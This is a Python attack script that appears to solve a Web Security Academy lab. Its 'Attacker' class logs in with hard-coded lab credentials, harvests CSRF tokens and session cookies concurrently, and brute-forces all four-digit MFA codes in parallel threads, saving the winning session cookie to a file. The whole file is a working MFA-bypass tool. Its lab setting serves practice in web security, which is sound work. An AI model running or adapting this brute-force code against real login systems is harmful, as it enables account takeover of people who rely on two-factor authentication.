import httpcore
import asyncio
import threading
import httpx
import lxml.etree
from classes.CConsole import CConsole
from classes.Client import Client
from classes.Monitor import Monitor

class Attacker:
    def __init__(self, console:CConsole):
        self.BASE_URL = "https://0a2800ce0413705281301153000b00df.web-security-academy.net"
        self.LOGIN_URL = self.BASE_URL + "/login"
        self.USERNAME = "carlos"
        self.PASSWORD = "montoya"
        self.console = console
        self.shared = Monitor(self.console)
        self.TIMEOUT = 4

    
    async def get_csrf_cookies(self, client: Client, url: str)->list[str]:
        self.console.log("getting csrf...")
        r = await client.get(url)
        cookies = None
        
        if r.headers.get("set-cookie") != None:
            cookies = r.headers.get("set-cookie").split(";")[0]
        else:
            cookies = r.request.headers.get("cookie").split(";")[0]
        html = lxml.etree.HTML(r.text)

        csrf = html.xpath('//input[contains(@name, "csrf")]/@value')[0]
        
        self.console.log(csrf, cookies)
        
        return [csrf, cookies]
    
    async def login(self, client: Client):
        self.console.log("logining...")
        csrf = (await self.get_csrf_cookies(client, self.LOGIN_URL))[0]
        r = await client.post(self.LOGIN_URL, data={"csrf": csrf, "username": self.USERNAME, "password": self.PASSWORD})
        
        url = r.headers.get("Location")
        assert url != "/login", "login was not successful, check that username:password combination is correct!"
        
        self.console.log("login success ===>", url)
        
        
        return url
    
    async def send_mfa(self, client: Client, url:str, mfa_code: str, csrf: str, cookie: str):
        rcookie = httpx.Cookies(dict({"session": cookie.split("=")[1]}))
        r = await client.post(url, data={"csrf": csrf, "mfa-code": mfa_code}, cookies=rcookie)
        
        self.console.log("Incorrect security code" not in r.text, r.status_code, mfa_code)
        
        if r.status_code == 302:
            cookie = r.headers.get('set-cookie')
            print("cookie:", cookie, "status code:", r.status_code, "Location", r.headers.get('Location'))
            with open("found", "w") as f:
                f.write(f"csfr: {csrf} cookie: {cookie} Location: {r.headers.get('Location')} mfa-code: {mfa_code}")
            
            return [csrf, cookie, "found"]
        elif r.status_code == 400:
            print("bad request (unusual), retyring...")
            return [csrf, cookie, "bad_request"]
        
        return [csrf, cookie, mfa_code]
    
    async def find_mfa(self):
        async with Client() as client:
            mfa_codes = []
            for i in range(self.shared.TOTAL):
                mfa_code = "0"*(4-len(str(i)))+str(i)
                mfa_codes.append(mfa_code)
            
            attempts_before_timeout = 0
            while len(mfa_codes) > 0 and attempts_before_timeout != self.TIMEOUT:
                prev_len_mfa_codes = len(mfa_codes)
                tasks = []
                
                buffer = self.shared.get_buffer()
                
                for param,mfa_code in zip(buffer[:self.shared.limit], mfa_codes):
                    csrf, cookie = param
                    tasks.append(asyncio.create_task(self.send_mfa(client, self.BASE_URL+"/login2", mfa_code, csrf, cookie)))
                
                for k, task in enumerate(tasks):
                    try:
                        succ = await task
                        if "found" in succ:
                            print(succ)
                            self.console.log("done!")
                            self.shared.set_found(True)
                            try:
                                print("cleaning up...")
                                await asyncio.gather(*tasks[k+1:])
                            except(Exception):
                                print("cleaning up...")
                            return True
                        elif "bad_request" in succ:
                            self.shared.increment_n()
                        else:
                            mfa_codes.remove(succ[2])

                        self.shared.remove_from_buffer(succ[:2])
                    except(httpx.ConnectError, httpx.ConnectTimeout, httpx.ReadError, httpx.ReadTimeout, httpcore.ReadTimeout, httpcore.ConnectTimeout):
                        self.console.log("something went wrong, retrying...")

                print(f"find_mfa: ### {int(100*(1-len(mfa_codes)/self.shared.TOTAL))}% done ###")
                
                if self.shared.found:
                    return True

                if prev_len_mfa_codes == len(mfa_codes):
                    attempts_before_timeout = attempts_before_timeout + 1
                    print("find_mfa: attempts rest before timeout:", self.TIMEOUT - attempts_before_timeout)
                else:
                    attempts_before_timeout = 0
                
        
        if attempts_before_timeout == self.TIMEOUT:
            print("check your connection, or the URL has expired!")

        self.console.log("nothing was found, sorry!")
        return False

    async def get_mfa_csrf_cookie(self):
        async with Client() as client:
            url = await self.login(client)
            mfa_csrf_cookie = await self.get_csrf_cookies(client, self.BASE_URL+url)
        
        return mfa_csrf_cookie

    async def collect_mfa_csrf_cookies(self):
        n = self.shared.TOTAL
        attempts_before_timeout = 0
        while n > 0 and not self.shared.get_found() and attempts_before_timeout != self.TIMEOUT:
            prev_n = n
            
            tasks = []
            
            for i in range(self.shared.limit):
                tasks.append(asyncio.create_task(self.get_mfa_csrf_cookie()))
                if i == n:
                    break

            for task in tasks:
                try:
                    cc = await task
                    self.shared.append_to_buffer(cc)
                    n = self.shared.decrement_n()
                except (httpx.ConnectError, httpx.ConnectTimeout, httpx.ReadError, httpx.ReadTimeout, httpcore.ReadTimeout):
                    self.console.log("something went wrong, retrying...")
            
            print(f"collect_attack_params: ### {int(100*(1-n/self.shared.TOTAL))}% done ###")

            if prev_n == n:
                attempts_before_timeout = attempts_before_timeout + 1
                print("collect_attack_params: attempts rest before timeout:", self.TIMEOUT - attempts_before_timeout)
            else:
                attempts_before_timeout = 0
        
        if attempts_before_timeout == self.TIMEOUT:
            print("check your connection, or the URL has expired!")
            
    def run_collect(self):
        asyncio.run(self.collect_mfa_csrf_cookies())
    
    def run_find(self):
        asyncio.run(self.find_mfa())
        
    
    def start_attack(self):
        collector_th = threading.Thread(target=self.run_collect)
        finder_th = threading.Thread(target=self.run_find)
        
        collector_th.start()
        finder_th.start()
        
        collector_th.join()
        finder_th.join()